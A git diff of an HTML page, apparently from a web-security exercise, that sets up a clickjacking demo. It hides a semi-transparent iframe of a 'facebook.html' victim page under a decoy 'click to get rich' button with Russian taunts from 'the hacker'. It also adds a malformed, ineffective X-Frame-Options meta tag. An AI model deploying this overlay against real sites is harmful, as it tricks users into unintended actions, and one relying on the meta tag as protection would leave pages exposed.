@@ -1,15 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"> -->
+    <meta http-equiv="X-Frame-Options" DENY>
     <link rel="stylesheet" href="style.css">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <style>
+        iframe {
+            width: 400px;
+            height: 100px;
+            position:absolute;
+            top:5px;
+            left: -14px;
+            opacity:0.6;
+            z-index: 1;
+        }
+    </style>
+    
 </head>
 <body>
-      
-
+    <div>Нажмите, чтобы разбогатеть:</div>
+    <!-- Url с сайта жертвы -->
+    <iframe src="facebook.html" ></iframe>
+    <!-- sandbox="allow-scripts allow-forms" -->
+    <button>Нажмите сюда!</button>
+    <div>... И всё будет супер (у меня, хакера)</div>
     <script src="script.js"></script>
 </body>
 </html>
